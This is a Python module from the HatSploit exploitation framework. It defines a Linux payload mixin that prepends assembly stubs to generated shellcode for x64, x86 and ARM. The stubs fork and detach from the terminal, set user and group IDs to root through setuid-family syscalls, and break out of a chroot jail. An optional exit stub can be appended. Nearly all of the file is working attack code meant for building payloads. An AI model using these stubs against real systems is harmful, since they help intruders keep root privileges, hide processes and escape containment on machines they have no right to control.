"""
MIT License

Copyright (c) 2020-2024 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

from hatsploit.lib.base import BaseMixin
from pex.string import String

from hatsploit.lib.core.payload.basic import (
    ARCH_X64,
    ARCH_X86,
    ARCH_ARMLE,
    ARCH_ARMBE,
)

from hatsploit.lib.ui.option import (
    BooleanOption
)


class Linux(BaseMixin):
    """ Main class of hatsploit.lib.core.payload.macos module.

    This main class of hatsploit.lib.core.payload module is intended
    to provide linux-specific payload options.
    """

    def __init__(self, info: dict = {}) -> None:
        """ Initialize Linux mixin.

        :param dict info: mixin info
        :return None: None
        """

        super().__init__(info)

        self.fork = BooleanOption(
            'PrependFork',
            'no',
            "Prepend a stub that executes fork().",
            False,
            advanced=True
        )

        self.setresuid = BooleanOption(
            'PrependSetresuid',
            'no',
            "Prepend a stub that executes setresuid(0, 0, 0)",
            False,
            advanced=True
        )

        self.setreuid = BooleanOption(
            'PrependSetreuid',
            'no',
            "Prepend a stub that executes setreuid(0, 0)",
            False,
            advanced=True
        )

        self.setuid = BooleanOption(
            'PrependSetuid',
            'no',
            "Prepend a stub that executes setuid(0)",
            False,
            advanced=True
        )

        self.setresgid = BooleanOption(
            'PrependSetresgid',
            'no',
            "Prepend a stub that executes setresgid(0, 0, 0)",
            False,
            advanced=True
        )

        self.setregid = BooleanOption(
            'PrependSetregid',
            'no',
            "Prepend a stub that executes setregid(0, 0)",
            False,
            advanced=True
        )

        self.setgid = BooleanOption(
            'PrependSetgid',
            'no',
            "Prepend a stub that executes setgid(0)",
            False,
            advanced=True
        )

        self.chroot_break = BooleanOption(
            'PrependChrootBreak',
            'no',
            "Prepend a stub that breaks chroot.",
            False,
            advanced=True
        )

        self.exit = BooleanOption(
            'AppendExit',
            'no',
            "Append a stub that executes exit(0)",
            False,
            advanced=True
        )

    def apply(self, payload: bytes) -> bytes:
        """ Apply available prepends.

        :param bytes payload: payload data
        :return bytes: payload
        """

        if self.info['Arch'] == ARCH_X64:
            return self.apply_x64(payload)

        elif self.info['Arch'] == ARCH_X86:
            return self.apply_x86(payload)

        elif self.info['Arch'] in [ARCH_ARMLE, ARCH_ARMBE]:
            return self.apply_arm(payload)

        return payload

    def apply_arm(self, payload: bytes) -> bytes:
        """ Prepend/append available arm prepends/appends.

        :param bytes payload: payload data
        :return bytes: payload
        """

        prepend = b""
        append = b""

        if self.setuid.value:
            prepend += self.__asm__(
                """
                setuid:
                    eor r0, r0, r0
                    mov r7, 23
                    svc 0
                """
            )

        if self.setresuid.value:
            prepend += self.__asm__(
                """
                setresuid:
                    eor r0, r0, r0
                    eor r1, r1, r1
                    eor r2, r2, r2
                    mov r7, 0xa4
                    svc 0
                """
            )

        return prepend + payload + append

    def apply_x64(self, payload: bytes) -> bytes:
        """ Prepend/append available x64 prepends/appends.

        :param bytes payload: payload data
        :return bytes: payload
        """

        prepend = b""
        append = b""

        if self.fork.value:
            prepend += self.__asm__(
                """
                fork:
                    push 57
                    pop rax
                    syscall

                    test rax, rax
                    jz setsid

                exit:
                    xor rdi, rdi
                    push 60
                    pop rax
                    syscall

                setsid:
                    add al, 112
                    syscall

                    push 57
                    pop rax
                    syscall

                    test rax, rax
                    jnz exit
                """
            )

        if self.setresuid.value:
            prepend += self.__asm__(
                """
                setresuid:
                    xor rdi, rdi
                    mov rsi, rdi
                    push 0x75
                    pop rax
                    syscall
                """
            )

        if self.setreuid.value:
            prepend += self.__asm__(
                """
                setreuid:
                    xor rdi, rdi
                    mov rsi, rdi
                    mov rdx, rsi
                    push 0x71
                    pop rax
                    syscall
                """
            )

        if self.setuid.value:
            prepend += self.__asm__(
                """
                setuid:
                    xor rdi, rdi
                    push 0x69
                    pop rax
                    syscall
                """
            )

        if self.setresgid.value:
            prepend += self.__asm__(
                """
                setresgid:
                    xor rdi, rdi
                    mov rsi, rdi
                    push 0x77
                    pop rax
                    syscall
                """
            )

        if self.setregid.value:
            prepend += self.__asm__(
                """
                setregid:
                    xor rdi, rdi
                    mov rsi, rdi
                    mov rdx, rsi
                    push 0x72
                    pop rax
                    syscall
                """
            )

        if self.setgid.value:
            prepend += self.__asm__(
                """
                setgid:
                    xor rdi, rdi
                    push 0x6a
                    pop rax
                    syscall
                """
            )

        if self.chroot_break.value:
            prepend += self.__asm__(
                f"""
                setreuid:
                    xor rdi, rdi
                    mov rsi, rdi
                    mov rax, rdi
                    mov al, 0x71
                    syscall

                mkdir:
                    mov rdi, 0x{String().random_string(8).encode().hex()}
                    push rsi
                    push rdi
                    mov rdi, rsp
                    mov si, 0755
                    push 0x53
                    pop rax
                    syscall

                chroot:
                    xor rdx, rdx
                    mov dl, 0xa1
                    mov rax, rdx
                    syscall

                    mov si, 0x2e2e
                    push rsi
                    mov rdi, rsp

                    push 0x45
                    pop rbx
                    push 0x50
                    pop rax
                    syscall

                    dec bl
                    jnz -7

                    push 0x2e
                    mov rdi, rsp
                    mov rax, rdx
                    syscall
                """
            )

        if self.exit.value:
            append += self.__asm__(
                """
                exit:
                    xor rdi, rdi
                    push 0x3c
                    pop rax
                    syscall
                """
            )

        return prepend + payload + append

    def apply_x86(self, payload: bytes) -> bytes:
        """ Prepend/append available x86 prepends/appends.

        :param bytes payload: payload data
        :return bytes: payload
        """

        prepend = b""
        append = b""

        if self.fork.value:
            prepend += self.__asm__(
                """
                fork:
                    push 0x2
                    pop eax
                    int 0x80

                    test eax, eax
                    jz setsid

                exit:
                    xor eax, eax
                    mov al, 0x1
                    int 0x80

                setsid:
                    mov al, 0x42
                    int 0x80

                    push 0x2
                    pop eax
                    int 0x80

                    test eax, eax
                    jnz exit
                """
            )

        if self.setresuid.value:
            prepend += self.__asm__(
                """
                setresuid:
                    xor ecx, ecx
                    xor ebx, ebx
                    mul ebx
                    mov al, 0xa4
                    int 0x80
                """
            )

        if self.setreuid.value:
            prepend += self.__asm__(
                """
                setreuid:
                    xor ecx, ecx
                    xor ebx, ebx
                    push 0x46
                    pop eax
                    int 0x80
                """
            )

        if self.setuid.value:
            prepend += self.__asm__(
                """
                setuid:
                    xor ebx, ebx
                    push 0x17
                    pop eax
                    int 0x80
                """
            )

        if self.setresgid.value:
            prepend += self.__asm__(
                """
                setresgid:
                    xor ecx, ecx
                    xor ebx, ebx
                    mul ebx
                    mov al, 0xaa
                    int 0x80
                """
            )

        if self.setregid.value:
            prepend += self.__asm__(
                """
                setregid:
                    xor ecx, ecx
                    xor ebx, ebx
                    push 0x47
                    pop eax
                    int 0x80
                """
            )

        if self.setgid.value:
            prepend += self.__asm__(
                """
                setgid:
                    xor ebx, ebx
                    push 0x2e
                    pop eax
                    int 0x80
                """
            )

        if self.chroot_break.value:
            prepend += self.__asm__(
                """
                setreuid:
                    xor ecx, ecx
                    xor ebx, ebx
                    push 0x46
                    pop eax
                    int 0x80

                mkdir:
                    push 0x3d
                    mov ebx, esp
                    push 0x27
                    pop eax
                    int 0x80

                chroot:
                    mov ecx, ebx
                    pop eax
                    int 0x80

                    xor eax, eax
                    push eax
                    push 0x2e2e
                    mov ebx, esp

                    push 0x1e
                    pop ecx
                    mov al, 0xc
                    int 0x80
                    loop -4

                    push 0x3d
                    mov ecx, ebx
                    pop eax
                    int 0x80
                """
            )

        if self.exit.value:
            append += self.__asm__(
                """
                exit:
                    xor ebx, ebx
                    push 0x1
                    pop eax
                    int 0x80
                """
            )

        return prepend + payload + append
